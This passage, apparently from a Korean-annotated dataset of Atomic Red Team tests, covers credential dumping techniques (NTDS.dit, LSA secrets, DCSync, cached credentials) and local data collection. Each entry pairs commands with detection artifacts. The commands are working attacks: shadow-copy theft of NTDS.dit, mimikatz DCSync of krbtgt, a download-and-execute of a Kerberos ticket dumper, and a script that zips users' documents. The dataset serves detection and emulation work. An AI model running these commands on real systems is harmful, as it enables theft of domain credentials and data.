+      "summary": "도메인 컨트롤러에서 vssadmin.exe를 사용해 지정 드라이브(C:)의 볼륨 섀도 카피를 생성한다. 이후 NTDS.dit와 SYSTEM 하이브를 섀도 카피에서 복사해 도메인 크리덴셜을 덤프하는 전 단계로 사용된다.",
+      "commands": [
+        {
+          "executor": "command_prompt",
+          "elevation_required": true,
+          "command": "vssadmin.exe create shadow /for=#{drive_letter}"
+        }
+      ],
+      "artifacts": {
+        "files_created": [],
+        "files_read": [],
+        "registry_keys": [],
+        "processes": [
+          {
+            "name": "vssadmin.exe",
+            "description": "지정 드라이브에 대한 볼륨 섀도 카피를 생성",
+            "commandline_pattern": "vssadmin.exe create shadow /for=*"
+          }
+        ],
+        "network": []
+      },
+      "tags": {
+        "action": ["process_start", "vss_access"],
+        "domain": ["CredentialAccess"],
+        "ttp": ["OS_Credential_Dumping", "NTDS_Dump", "VSS_Abuse"]
+      }
+    },
+    {
+      "test_id": "T1003.003-2",
+      "name": "Copy NTDS.dit from Volume Shadow Copy",
+      "platforms": ["windows"],
+      "summary": "이미 존재하는 볼륨 섀도 카피에서 NTDS.dit와 SYSTEM 하이브를 복사하고, 현재 HKLM\\SYSTEM 하이브를 reg save로 내보내 도메인 크리덴셜 복호화에 필요한 재료를 모두 수집한다.",
+      "commands": [
+        {
+          "executor": "command_prompt",
+          "elevation_required": true,
+          "command": "copy #{vsc_name}\\Windows\\NTDS\\NTDS.dit #{extract_path}\\ntds.dit\r\ncopy #{vsc_name}\\Windows\\System32\\config\\SYSTEM #{extract_path}\\VSC_SYSTEM_HIVE\r\nreg save HKLM\\SYSTEM #{extract_path}\\SYSTEM_HIVE"
+        }
+      ],
+      "artifacts": {
+        "files_created": [
+          {
+            "path": "#{extract_path}\\ntds.dit",
+            "description": "볼륨 섀도 카피에서 복사한 Active Directory 데이터베이스"
+          },
+          {
+            "path": "#{extract_path}\\VSC_SYSTEM_HIVE",
+            "description": "볼륨 섀도 카피에서 복사한 SYSTEM 하이브"
+          },
+          {
+            "path": "#{extract_path}\\SYSTEM_HIVE",
+            "description": "현재 HKLM\\SYSTEM에서 저장한 SYSTEM 하이브"
+          }
+        ],
+        "files_read": [
+          {
+            "path": "#{vsc_name}\\Windows\\NTDS\\NTDS.dit",
+            "description": "섀도 카피 상의 원본 NTDS 데이터베이스"
+          },
+          {
+            "path": "#{vsc_name}\\Windows\\System32\\config\\SYSTEM",
+            "description": "섀도 카피 상의 SYSTEM 하이브"
+          }
+        ],
+        "registry_keys": [
+          {
+            "path": "HKLM\\SYSTEM",
+            "description": "부트키 및 도메인 계정 해시 복호화에 필요한 시스템 구성 정보"
+          }
+        ],
+        "processes": [
+          {
+            "name": "cmd.exe / copy",
+            "description": "섀도 카피 경로에서 NTDS.dit와 SYSTEM 하이브를 로컬 경로로 복사",
+            "commandline_pattern": "copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy*\\Windows\\*"
+          },
+          {
+            "name": "reg.exe",
+            "description": "HKLM\\SYSTEM 하이브를 파일로 저장",
+            "commandline_pattern": "reg save HKLM\\SYSTEM *SYSTEM_HIVE"
+          }
+        ],
+        "network": []
+      },
+      "tags": {
+        "action": ["file_copy", "registry_export"],
+        "domain": ["CredentialAccess"],
+        "ttp": ["OS_Credential_Dumping", "NTDS_Dump", "VSS_Abuse"]
+      }
+    },
+    {
+      "test_id": "T1003.003-3",
+      "name": "Dump Active Directory Database with NTDSUtil",
+      "platforms": ["windows"],
+      "summary": "도메인 컨트롤러에서 NTDSUtil의 IFM(Install From Media) 기능을 사용해 ntds.dit를 오프라인 백업 형태로 덤프한다. 지정 폴더에 AD 데이터베이스 복사본이 생성된다.",
+      "commands": [
+        {
+          "executor": "command_prompt",
+          "elevation_required": true,
+          "command": "mkdir #{output_folder}\r\nntdsutil \"ac i ntds\" \"ifm\" \"create full #{output_folder}\" q q"
+        }
+      ],
+      "artifacts": {
+        "files_created": [
+          {
+            "path": "#{output_folder}",
+            "description": "NTDSUtil IFM 백업이 저장된 폴더(내부에 ntds.dit 및 관련 파일 존재)"
+          }
+        ],
+        "files_read": [],
+        "registry_keys": [],
+        "processes": [
+          {
+            "name": "ntdsutil.exe",
+            "description": "IFM 기능으로 NTDS 데이터베이스를 디스크로 덤프",
+            "commandline_pattern": "ntdsutil \"ac i ntds\" \"ifm\" \"create full *"
+          }
+        ],
+        "network": []
+      },
+      "tags": {
+        "action": ["process_start", "database_backup"],
+        "domain": ["CredentialAccess"],
+        "ttp": ["OS_Credential_Dumping", "NTDS_Dump"]
+      }
+    },
+    {
+      "test_id": "T1003.003-4",
+      "name": "Create Volume Shadow Copy with WMI",
+      "platforms": ["windows"],
+      "summary": "도메인 컨트롤러에서 WMI(wmic shadowcopy)를 사용해 지정 드라이브에 볼륨 섀도 카피를 생성한다. vssadmin 대신 WMI 인터페이스를 활용하는 방식이다.",
+      "commands": [
+        {
+          "executor": "command_prompt",
+          "elevation_required": true,
+          "command": "wmic shadowcopy call create Volume=#{drive_letter}"
+        }
+      ],
+      "artifacts": {
+        "files_created": [],
+        "files_read": [],
+        "registry_keys": [],
+        "processes": [
+          {
+            "name": "wmic.exe",
+            "description": "Win32_ShadowCopy 클래스 호출로 섀도 카피 생성",
+            "commandline_pattern": "wmic shadowcopy call create Volume=*"
+          }
+        ],
+        "network": []
+      },
+      "tags": {
+        "action": ["process_start", "vss_access"],
+        "domain": ["CredentialAccess"],
+        "ttp": ["OS_Credential_Dumping", "NTDS_Dump", "VSS_Abuse"]
+      }
+    },
+    {
+      "test_id": "T1003.003-5",
+      "name": "Create Volume Shadow Copy remotely with WMI",
+      "platforms": ["windows"],
+      "summary": "도메인 관리자 권한이 있는 원격 워크스테이션에서 WMI 원격 호출(wmic /node)을 사용해 대상 도메인 컨트롤러에 볼륨 섀도 카피를 생성한다.",
+      "commands": [
+        {
+          "executor": "command_prompt",
+          "elevation_required": true,
+          "command": "wmic /node:\"#{target_host}\" shadowcopy call create Volume=#{drive_letter}"
+        }
+      ],
+      "artifacts": {
+        "files_created": [],
+        "files_read": [],
+        "registry_keys": [],
+        "processes": [
+          {
+            "name": "wmic.exe",
+            "description": "원격 노드(target_host)에서 섀도 카피 생성 요청",
+            "commandline_pattern": "wmic /node:* shadowcopy call create Volume=*"
+          }
+        ],
+        "network": [
+          {
+            "description": "원격 도메인 컨트롤러(target_host)와의 WMI(RPC/DCOM) 통신"
+          }
+        ]
+      },
+      "tags": {
+        "action": ["process_start", "remote_execution", "vss_access"],
+        "domain": ["CredentialAccess"],
+        "ttp": ["OS_Credential_Dumping", "NTDS_Dump", "Remote_WMI"]
+      }
+    },
+    {
+      "test_id": "T1003.003-6",
+      "name": "Create Volume Shadow Copy remotely (WMI) with esentutl",
+      "platforms": ["windows"],
+      "summary": "원격 WMI를 사용해 대상 도메인 컨트롤러에서 cmd.exe /c esentutl.exe /y /vss 를 실행시켜 NTDS.dit를 스냅샷에서 바로 지정 경로로 복사한다.",
+      "commands": [
+        {
+          "executor": "command_prompt",
+          "elevation_required": true,
+          "command": "wmic /node:\"#{target_host}\" process call create \"cmd.exe /c esentutl.exe /y /vss #{source_path} /d #{target_path}\""
+        }
+      ],
+      "artifacts": {
+        "files_created": [
+          {
+            "path": "#{target_path}",
+            "description": "대상 호스트에서 esentutl.exe를 통해 복사된 NTDS.dit 파일"
+          }
+        ],
+        "files_read": [
+          {
+            "path": "#{source_path}",
+            "description": "섀도 카피 또는 원본 경로의 NTDS.dit 파일"
+          }
+        ],
+        "registry_keys": [],
+        "processes": [
+          {
+            "name": "wmic.exe",
+            "description": "원격 프로세스(cmd.exe / esentutl.exe) 생성을 요청하는 WMI 클라이언트",
+            "commandline_pattern": "wmic /node:* process call create \"cmd.exe /c esentutl.exe /y /vss *"
+          },
+          {
+            "name": "esentutl.exe",
+            "description": "대상 호스트에서 NTDS.dit를 VSS 기반으로 복사",
+            "commandline_pattern": "esentutl.exe /y /vss *ntds.dit*"
+          }
+        ],
+        "network": [
+          {
+            "description": "원격 WMI/RPC 통신을 통한 프로세스 생성 및 제어"
+          }
+        ]
+      },
+      "tags": {
+        "action": ["remote_execution", "file_copy", "vss_access"],
+        "domain": ["CredentialAccess"],
+        "ttp": ["OS_Credential_Dumping", "NTDS_Dump", "Remote_WMI", "VSS_Abuse"]
+      }
+    },
+    {
+      "test_id": "T1003.003-7",
+      "name": "Create Volume Shadow Copy with Powershell",
+      "platforms": ["windows"],
+      "summary": "PowerShell에서 WMI 클래스를 직접 호출해 win32_shadowcopy.Create를 실행하고, 지정 드라이브에 ClientAccessible 유형의 섀도 카피를 생성한다.",
+      "commands": [
+        {
+          "executor": "powershell",
+          "elevation_required": true,
+          "command": "(gwmi -list win32_shadowcopy).Create('#{drive_letter}','ClientAccessible')"
+        }
+      ],
+      "artifacts": {
+        "files_created": [],
+        "files_read": [],
+        "registry_keys": [],
+        "processes": [
+          {
+            "name": "powershell.exe",
+            "description": "WMI(win32_shadowcopy)를 사용해 섀도 카피 생성",
+            "commandline_pattern": "win32_shadowcopy).Create('*','ClientAccessible')"
+          }
+        ],
+        "network": []
+      },
+      "tags": {
+        "action": ["process_start", "vss_access"],
+        "domain": ["CredentialAccess"],
+        "ttp": ["OS_Credential_Dumping", "NTDS_Dump", "VSS_Abuse"]
+      }
+    },
+    {
+      "test_id": "T1003.003-8",
+      "name": "Create Symlink to Volume Shadow Copy",
+      "platforms": ["windows"],
+      "summary": "vssadmin으로 섀도 카피를 생성한 뒤 mklink /D를 사용해 해당 섀도 카피 경로를 가리키는 디렉터리 심볼릭 링크를 만든다. 이를 통해 일반 경로처럼 VSS 내용을 탐색·복사할 수 있다.",
+      "commands": [
+        {
+          "executor": "command_prompt",
+          "elevation_required": true,
+          "command": "vssadmin.exe create shadow /for=#{drive_letter}\r\nmklink /D #{symlink_path} \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1"
+        }
+      ],
+      "artifacts": {
+        "files_created": [
+          {
+            "path": "#{symlink_path}",
+            "description": "HarddiskVolumeShadowCopy1을 가리키는 디렉터리 심볼릭 링크"
+          }
+        ],
+        "files_read": [],
+        "registry_keys": [],
+        "processes": [
+          {
+            "name": "vssadmin.exe",
+            "description": "섀도 카피 생성",
+            "commandline_pattern": "vssadmin.exe create shadow /for=*"
+          },
+          {
+            "name": "cmd.exe / mklink",
+            "description": "섀도 카피 디바이스 경로를 대상으로 디렉터리 심볼릭 링크 생성",
+            "commandline_pattern": "mklink /D *HarddiskVolumeShadowCopy1"
+          }
+        ],
+        "network": []
+      },
+      "tags": {
+        "action": ["process_start", "vss_access", "symlink_create"],
+        "domain": ["CredentialAccess"],
+        "ttp": ["OS_Credential_Dumping", "NTDS_Dump", "VSS_Abuse"]
+      }
+    },
+    {
+      "test_id": "T1003.003-9",
+      "name": "Create Volume Shadow Copy with diskshadow",
+      "platforms": ["windows"],
+      "summary": "diskshadow.exe 스크립트 파일을 사용해 볼륨 섀도 카피를 생성하고 c:\\exfil 폴더 등으로 NTDS.dit를 추출하는 데 사용할 수 있는 환경을 만든다.",
+      "commands": [
+        {
+          "executor": "command_prompt",
+          "elevation_required": true,
+          "command": "mkdir c:\\exfil\r\ndiskshadow.exe /s #{filename}"
+        }
+      ],
+      "artifacts": {
+        "files_created": [
+          {
+            "path": "c:\\exfil",
+            "description": "diskshadow 스크립트에서 NTDS.dit 등을 저장하는 데 사용될 수 있는 폴더"
+          },
+          {
+            "path": "PathToAtomicsFolder\\T1003.003\\src\\diskshadow.txt",
+            "description": "diskshadow 명령을 포함하는 스크립트 파일(기본값 filename)"
+          }
+        ],
+        "files_read": [
+          {
+            "path": "PathToAtomicsFolder\\T1003.003\\src\\diskshadow.txt",
+            "description": "/s 옵션으로 diskshadow.exe가 읽는 스크립트"
+          }
+        ],
+        "registry_keys": [],
+        "processes": [
+          {
+            "name": "diskshadow.exe",
+            "description": "스크립트 기반으로 VSS 스냅샷을 생성하고 복사 작업 수행",
+            "commandline_pattern": "diskshadow.exe /s *diskshadow.txt"
+          }
+        ],
+        "network": []
+      },
+      "tags": {
+        "action": ["process_start", "vss_access"],
+        "domain": ["CredentialAccess"],
+        "ttp": ["OS_Credential_Dumping", "NTDS_Dump", "VSS_Abuse"]
+      }
+    }
+  ]
+},
+{
+  "technique_id": "T1003.004",
+  "technique_name": "OS Credential Dumping: LSA Secrets",
+  "tactic": "Credential Access",
+  "source": "AtomicRedTeam",
+  "description": "윈도우 LSA(현지 보안 기관)가 레지스트리에 저장하는 LSA Secrets 영역을 덤프해 서비스 계정, 캐시된 자격 증명, Kerberos 티켓 등의 민감 정보를 추출하는 기법이다.",
+  "tests": [
+    {
+      "test_id": "T1003.004-1",
+      "name": "Dumping LSA Secrets",
+      "platforms": ["windows"],
+      "summary": "PsExec를 SYSTEM 권한으로 실행해 HKLM\\security\\policy\\secrets 하위 키를 reg save로 %temp%\\secrets 파일로 덤프하는 시나리오다.",
+      "commands": [
+        {
+          "executor": "command_prompt",
+          "elevation_required": true,
+          "command": "\"#{psexec_exe}\" -accepteula -s reg save HKLM\\security\\policy\\secrets %temp%\\secrets /y"
+        }
+      ],
+      "artifacts": {
+        "files_created": [
+          {
+            "path": "%temp%\\secrets",
+            "description": "HKLM\\security\\policy\\secrets 키가 저장된 LSA Secrets 덤프 파일"
+          }
+        ],
+        "files_read": [
+          {
+            "path": "HKLM\\security\\policy\\secrets",
+            "description": "LSA Secrets가 저장된 레지스트리 위치"
+          }
+        ],
+        "registry_keys": [
+          {
+            "path": "HKLM\\security\\policy\\secrets",
+            "description": "LSA Secrets (서비스 계정, 기타 보안 정보) 저장 영역"
+          }
+        ],
+        "processes": [
+          {
+            "name": "PsExec.exe",
+            "description": "SYSTEM 권한으로 reg save를 실행하는 Sysinternals 도구",
+            "commandline_pattern": "PsExec.exe -accepteula -s reg save HKLM\\security\\policy\\secrets *"
+          },
+          {
+            "name": "reg.exe",
+            "description": "LSA Secrets 레지스트리 키를 파일로 저장",
+            "commandline_pattern": "reg save HKLM\\security\\policy\\secrets %temp%\\secrets /y"
+          }
+        ],
+        "network": [
+          {
+            "description": "사전 준비 단계에서 Sysinternals PSTools.zip을 다운로드하기 위한 HTTP/HTTPS 트래픽"
+          }
+        ]
+      },
+      "cleanup": [
+        "%temp%\\secrets 파일을 삭제해 LSA Secrets 덤프 흔적을 제거할 수 있다."
+      ],
+      "metadata": {
+        "atomic_source_id": "55295ab0-a703-433b-9ca4-ae13807de12f",
+        "reference_links": [
+          "https://attack.mitre.org/techniques/T1003/004/",
+          "https://pentestlab.blog/2018/04/04/dumping-clear-text-credentials/",
+          "https://github.com/redcanaryco/atomic-red-team/tree/master/atomics/T1003.004"
+        ]
+      },
+      "tags": {
+        "action": ["process_start", "registry_export", "file_create"],
+        "domain": ["CredentialAccess"],
+        "ttp": ["OS_Credential_Dumping", "LSA_Secrets_Dump"]
+      }
+    },
+    {
+      "test_id": "T1003.004-2",
+      "name": "Dump Kerberos Tickets from LSA using dumper.ps1",
+      "platforms": ["windows"],
+      "summary": "PowershellKerberos의 dumper.ps1을 원격에서 로드해 LSA 캐시에서 Kerberos 티켓을 덤프한다. 관리자 권한일 경우 자동으로 SYSTEM 권한으로 승격해 모든 세션 티켓을 수집한다.",
+      "commands": [
+        {
+          "executor": "powershell",
+          "elevation_required": true,
+          "command": "Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/MzHmO/PowershellKerberos/beed52acda37fc531ef0cb4df3fc2eb63a74bbb8/dumper.ps1')"
+        }
+      ],
+      "artifacts": {
+        "files_created": [],
+        "files_read": [],
+        "registry_keys": [],
+        "processes": [
+          {
+            "name": "powershell.exe",
+            "description": "원격 GitHub에서 dumper.ps1을 다운로드·실행해 Kerberos 티켓을 덤프",
+            "commandline_pattern": "DownloadString('https://raw.githubusercontent.com/MzHmO/PowershellKerberos/*/dumper.ps1')"
+          }
+        ],
+        "network": [
+          {
+            "description": "GitHub에서 dumper.ps1 스크립트를 다운로드하는 HTTP/HTTPS 트래픽"
+          }
+        ]
+      },
+      "cleanup": [
+        "메모리 기반 실행이므로 별도 아티팩트는 적지만, 명령 기록(PowerShell 로그, 프록시/방화벽 로그)로 행위 추적이 가능하다."
+      ],
+      "metadata": {
+        "atomic_source_id": "2dfa3bff-9a27-46db-ab75-7faefdaca732",
+        "reference_links": [
+          "https://attack.mitre.org/techniques/T1003/004/",
+          "https://github.com/MzHmO/PowershellKerberos/",
+          "https://github.com/redcanaryco/atomic-red-team/tree/master/atomics/T1003.004"
+        ]
+      },
+      "tags": {
+        "action": ["script_download", "process_start", "ticket_dump"],
+        "domain": ["CredentialAccess"],
+        "ttp": ["OS_Credential_Dumping", "Kerberos_Ticket_Dump"]
+      }
+    }
+  ]
+},
+{
+  "technique_id": "T1003.005",
+  "technique_name": "OS Credential Dumping: Cached Domain Credentials",
+  "tactic": "Credential Access",
+  "source": "AtomicRedTeam",
+  "description": "도메인 환경에서 사용자의 캐시된 도메인 자격 증명(로그온 시 로컬에 저장된 크리덴셜)을 악용·열람해 추가 시스템이나 서비스로의 횡적 이동에 사용하는 기법이다. 이 테스트는 cmdkey.exe를 통해 현재 사용자 컨텍스트에 저장된 인증 정보를 나열하는 행위를 모사한다.",
+  "tests": [
+    {
+      "test_id": "T1003.005-1",
+      "name": "Cached Credential Dump via Cmdkey",
+      "platforms": [
+        "windows"
+      ],
+      "summary": "내장 유틸리티 cmdkey.exe를 사용해 현재 사용자 프로파일에 저장된 캐시 자격 증명 목록을 나열한다. 암호 값은 표시되지 않지만 대상, 사용자 이름 등 연결에 사용할 수 있는 메타데이터를 수집할 수 있다.",
+      "procedure": [
+        "명령 프롬프트 또는 PowerShell에서 cmdkey /list를 실행한다.",
+        "출력에 표시되는 대상(서버/리소스)과 저장된 사용자 이름 정보를 확인하고, 추가 공격(재사용 가능 계정, RDP/SMB 연결 등)에 활용할 수 있는지 분석한다."
+      ],
+      "commands": [
+        {
+          "executor": "command_prompt",
+          "elevation_required": false,
+          "command": "cmdkey /list"
+        }
+      ],
+      "prerequisites": [
+        "테스트를 수행하는 계정 프로파일에 하나 이상 저장된 자격 증명이 존재해야 의미 있는 출력이 생성된다.",
+        "cmdkey.exe(Windows 내장 도구)가 기본 경로(C:\\Windows\\System32)에 존재해야 한다."
+      ],
+      "artifacts": {
+        "files_created": [],
+        "files_read": [],
+        "registry_keys": [],
+        "processes": [
+          {
+            "name": "cmdkey.exe",
+            "description": "현재 사용자 컨텍스트의 저장된 자격 증명 목록을 나열하는 윈도우 내장 유틸리티",
+            "commandline_pattern": "cmdkey /list"
+          }
+        ],
+        "network": []
+      },
+      "cleanup": [
+        "cmdkey /list는 조회만 수행하며 별도의 파일·레지스트리 변경이 없으므로 정리 단계는 필요하지 않다.",
+        "단, 포렌식 관점에서는 프로세스 실행 흔적(프로세스 생성 로그, 명령줄 로깅, 콘솔 히스토리 등)을 통해 행위를 추적할 수 있다."
+      ],
+      "metadata": {
+        "atomic_source_id": "56506854-89d6-46a3-9804-b7fde90791f9",
+        "reference_links": [
+          "https://attack.mitre.org/techniques/T1003/005/",
+          "https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/cmdkey",
+          "https://www.peew.pw/blog/2017/11/26/exploring-cmdkey-an-edge-case-for-privilege-escalation",
+          "https://github.com/redcanaryco/atomic-red-team/tree/master/atomics/T1003.005"
+        ]
+      },
+      "tags": {
+        "action": [
+          "process_start",
+          "credential_enumeration"
+        ],
+        "domain": [
+          "CredentialAccess"
+        ],
+        "ttp": [
+          "OS_Credential_Dumping",
+          "Cached_Domain_Credentials_Enum"
+        ]
+      }
+    }
+  ]
+},
+{
+  "technique_id": "T1003.006",
+  "technique_name": "OS Credential Dumping: DCSync",
+  "tactic": "Credential Access",
+  "source": "AtomicRedTeam",
+  "description": "DCSync는 공격자가 도메인 컨트롤러(DC)처럼 행동하며 도메인 복제(Directory Replication Service) 프로토콜을 악용해 계정 해시와 비밀 정보를 원격으로 요청·획득하는 기법이다. NTDS.dit를 직접 복사하거나 메모리를 덤프하지 않고도 krbtgt 계정 등 핵심 크리덴셜을 탈취할 수 있어 도메인 관리자 계정 탈취, 골든 티켓 생성 등으로 이어질 수 있다.",
+  "tests": [
+    {
+      "test_id": "T1003.006-1",
+      "name": "DCSync (Active Directory)",
+      "platforms": [
+        "windows"
+      ],
+      "summary": "Mimikatz lsadump::dcsync 모듈을 사용해 도메인 복제 프로토콜을 통해 원격 도메인 컨트롤러에서 대상 사용자(기본 krbtgt)의 계정 정보를 요청·덤프하는 시나리오이다.",
+      "procedure": [
+        "도메인 관리자 또는 동급 권한(복제 권한 포함)을 가진 계정 컨텍스트에서 Mimikatz 실행 파일을 준비한다.",
+        "lsadump::dcsync /domain:#{domain} /user:#{user}@#{domain} 명령을 사용해 도메인 컨트롤러에 복제 요청을 보내고, 해시·비밀 정보를 포함한 계정 데이터를 수신한다.",
+        "결과로 출력된 NTLM 해시, Kerberos 관련 값 등을 후속 공격(골든 티켓, 패스더해시 등)에 활용할 수 있다."
+      ],
+      "commands": [
+        {
+          "executor": "command_prompt",
+          "elevation_required": false,
+          "command": "#{mimikatz_path} \"lsadump::dcsync /domain:#{domain} /user:#{user}@#{domain}\" \"exit\""
+        }
+      ],
+      "prerequisites": [
+        "mimikatz.exe가 #{mimikatz_path} 위치에 존재해야 한다.",
+        "현재 사용자 계정이 도메인 관리자, 도메인 컨트롤러 계정 또는 복제 권한이 부여된 계정이어야 한다.",
+        "대상 도메인 컨트롤러에 네트워크로 접근 가능해야 한다."
+      ],
+      "artifacts": {
+        "files_created": [],
+        "files_read": [],
+        "registry_keys": [],
+        "processes": [
+          {
+            "name": "mimikatz.exe",
+            "description": "lsadump::dcsync 모듈을 통해 도메인 복제 프로토콜을 악용해 계정 정보를 덤프하는 도구",
+            "commandline_pattern": "*lsadump::dcsync /domain:* /user:*@*"
+          }
+        ],
+        "network": [
+          {
+            "description": "도메인 컨트롤러와의 AD 복제 트래픽(DS-RPC/LSARPC 등)을 통해 계정 데이터를 요청·수신하는 네트워크 통신"
+          }
+        ]
+      },
+      "cleanup": [
+        "로컬 디스크에는 기본적으로 별도 파일이 생성되지 않지만, 콘솔 로그·이벤트 로그·네트워크 로그에 흔적이 남을 수 있다.",
+        "포렌식·탐지 관점에서는 프로세스 생성 이벤트, 명령줄 로깅, DC 보안 로그(Directory Service 로그)에서 DCSync 관련 이벤트를 모니터링할 수 있다."
+      ],
+      "metadata": {
+        "atomic_source_id": "129efd28-8497-4c87-a1b0-73b9a870ca3e",
+        "reference_links": [
+          "https://attack.mitre.org/techniques/T1003/006/",
+          "https://adsecurity.org/?p=1729",
+          "https://github.com/redcanaryco/atomic-red-team/tree/master/atomics/T1003.006"
+        ]
+      },
+      "tags": {
+        "action": [
+          "process_start",
+          "directory_replication",
+          "credential_dump"
+        ],
+        "domain": [
+          "CredentialAccess"
+        ],
+        "ttp": [
+          "OS_Credential_Dumping",
+          "DCSync",
+          "AD_Repl_Abuse"
+        ]
+      }
+    },
+    {
+      "test_id": "T1003.006-2",
+      "name": "Run DSInternals Get-ADReplAccount",
+      "platforms": [
+        "windows"
+      ],
+      "summary": "DSInternals 모듈의 Get-ADReplAccount cmdlet을 사용해 도메인 컨트롤러(기본 %LOGONSERVER%)로부터 AD 복제 계정 정보를 조회·덤프하는 시나리오이다.",
+      "procedure": [
+        "PowerShell 환경에 DSInternals 모듈이 설치되어 있어야 한다.",
+        "Get-ADReplAccount -All -Server #{logonserver} 명령을 실행해 대상 도메인 컨트롤러에서 모든 계정의 복제 정보를 조회한다.",
+        "표준 출력에 표시되는 도메인 이름, 계정 정보, 해시 관련 데이터 등을 확인하고 추가 공격에 활용할 수 있다."
+      ],
+      "commands": [
+        {
+          "executor": "powershell",
+          "elevation_required": false,
+          "command": "Get-ADReplAccount -All -Server #{logonserver}"
+        }
+      ],
+      "prerequisites": [
+        "PowerShell 환경에 DSInternals 모듈이 설치되어 있어야 한다(Install-Module -Name DSInternals 등).",
+        "도메인 컨트롤러(#{logonserver})에 대해 AD 복제 정보를 조회할 수 있는 권한이 필요하다.",
+        "도메인 컨트롤러와의 네트워크 연결이 가능해야 한다."
+      ],
+      "artifacts": {
+        "files_created": [],
+        "files_read": [],
+        "registry_keys": [],
+        "processes": [
+          {
+            "name": "powershell.exe",
+            "description": "DSInternals 모듈을 사용해 AD 복제 계정 정보를 조회하는 PowerShell 프로세스",
+            "commandline_pattern": "Get-ADReplAccount -All -Server *"
+          }
+        ],
+        "network": [
+          {
+            "description": "도메인 컨트롤러(#{logonserver})와의 LDAP/LDAPS 및 RPC 기반 AD 복제 정보 조회 트래픽"
+          }
+        ]
+      },
+      "cleanup": [
+        "기본 테스트는 파일을 남기지 않고 표준 출력으로만 결과를 표시하므로 별도 정리 작업은 필요 없다.",
+        "다만 PowerShell 로그, 도메인 컨트롤러 보안 로그, 네트워크 로그에 쿼리 흔적이 남을 수 있다."
+      ],
+      "metadata": {
+        "atomic_source_id": "a0bced08-3fc5-4d8b-93b7-e8344739376e",
+        "reference_links": [
+          "https://attack.mitre.org/techniques/T1003/006/",
+          "https://www.dsinternals.com/en/retrieving-active-directory-passwords-remotely/",
+          "https://www.crowdstrike.com/blog/observations-from-the-stellarparticle-campaign/",
+          "https://github.com/redcanaryco/atomic-red-team/tree/master/atomics/T1003.006"
+        ]
+      },
+      "tags": {
+        "action": [
+          "process_start",
+          "directory_replication",
+          "credential_enum"
+        ],
+        "domain": [
+          "CredentialAccess"
+        ],
+        "ttp": [
+          "OS_Credential_Dumping",
+          "DCSync",
+          "AD_Repl_Abuse"
+        ]
+      }
+    }
+  ]
+},
+{
+  "technique_id": "T1005",
+  "technique_name": "Data from Local System",
+  "tactic": "Collection",
+  "source": "AtomicRedTeam",
+  "description": "이 기법은 로컬 시스템 내 사용자 디렉터리, 문서 폴더 등에서 민감한 파일(문서, 텍스트 등)을 찾아 수집하는 행위다. 공격자는 특정 확장자를 가진 파일만 선별 검색한 뒤, 추후 유출을 위해 하나의 압축 파일로 묶어두는 등 사전 준비(컬렉션)를 수행한다. 일반 사용자 활동과 구분이 어려워 파일 접근 패턴, 압축 생성 시점, 경로 등을 종합적으로 분석해야 한다.",
+  "tests": [
+    {
+      "test_id": "T1005-1",
+      "name": "Search files of interest and save them to a single zip file (Windows)",
+      "platforms": [
+        "windows"
+      ],
+      "summary": "지정한 시작 디렉터리(기본 C:\\Users) 아래에서 특정 확장자(.doc, .docx, .txt) 파일만 재귀적으로 검색하고, 발견된 파일들을 하나의 ZIP 파일로 묶어 저장한다. 공격자가 로컬 문서들을 선별 수집해 이후 유출을 준비하는 전형적인 시나리오를 에뮬레이션한다.",
+      "procedure": [
+        "시작 디렉터리(starting_directory)와 출력 폴더(output_zip_folder_path), 검색 대상 확장자 목록(file_extensions)을 설정한다.",
+        "출력 폴더가 존재하지 않으면 PowerShell New-Item으로 생성한다.",
+        "Get-ChildItem -Recurse로 시작 디렉터리 아래 모든 파일을 나열한 뒤, 확장자가 지정된 목록에 포함되는 파일만 필터링한다.",
+        "필터링된 파일이 하나 이상이면 Compress-Archive를 사용해 모두 data.zip 하나로 압축한다.",
+        "압축이 생성되면 경로를 출력하고, 대상 파일이 없으면 \"No files found\" 메시지를 출력한다."
+      ],
+      "commands": [
+        {
+          "executor": "powershell",
+          "elevation_required": false,
+          "command": "$startingDirectory = \"#{starting_directory}\";\n$outputZip = \"#{output_zip_folder_path}\";\n$fileExtensionsString = \"#{file_extensions}\";\n$fileExtensions = $fileExtensionsString -split \", \";\n\nNew-Item -Type Directory $outputZip -ErrorAction Ignore -Force | Out-Null;\n\nFunction Search-Files {\n  param (\n    [string]$directory\n  )\n  $files = Get-ChildItem -Path $directory -File -Recurse | Where-Object {\n    $fileExtensions -contains $_.Extension.ToLower()\n  };\n  return $files;\n}\n\n$foundFiles = Search-Files -directory $startingDirectory;\nif ($foundFiles.Count -gt 0) {\n  $foundFilePaths = $foundFiles.FullName;\n  Compress-Archive -Path $foundFilePaths -DestinationPath \"$outputZip\\data.zip\";\n  Write-Host \"Zip file created: $outputZip\\data.zip\";\n} else {\n  Write-Host \"No files found with the specified extensions.\";\n}"
+        }
+      ],
+      "prerequisites": [
+        "starting_directory 경로에 접근 가능한 권한이 있어야 한다 (기본값은 C:\\Users).",
+        "PowerShell 환경에서 Compress-Archive 및 Get-ChildItem -Recurse 사용이 가능해야 한다.",
+        "output_zip_folder_path에 폴더를 생성하고 data.zip을 쓸 수 있는 쓰기 권한이 필요하다."
+      ],
+      "artifacts": {
+        "files_created": [
+          {
+            "path": "PathToAtomicsFolder\\..\\ExternalPayloads\\T1005\\data.zip",
+            "description": "지정된 확장자의 파일들을 하나로 묶어 저장한 ZIP 압축 파일"
+          }
+        ],
+        "files_read": [
+          {
+            "path": "C:\\Users\\* (.doc, .docx, .txt 등)",
+            "description": "사용자 프로필 하위의 문서·텍스트 파일들을 재귀적으로 열람하여 목록을 수집"
+          }
+        ],
+        "registry_keys": [],
+        "processes": [
+          {
+            "name": "powershell.exe",
+            "description": "파일 검색 및 Compress-Archive를 실행해 ZIP 파일을 생성하는 데 사용된 프로세스",
+            "commandline_pattern": "Compress-Archive -Path * -DestinationPath *data.zip*"
+          }
+        ],
+        "network": []
+      },
+      "cleanup": [
+        "테스트 종료 후 생성된 ZIP 파일(PathToAtomicsFolder\\..\\ExternalPayloads\\T1005\\data.zip)을 삭제해 수집된 데이터 흔적을 제거할 수 있다."
+      ],
+      "tags": {
+        "action": [
+          "file_search",
+          "file_read",
+          "file_compress",
+          "file_create"
+        ],
+        "domain": [
+          "Collection",
+          "Exfiltration_Preparation"
+        ],
+        "ttp": [
+          "Data_From_Local_System"
+        ]
+      },
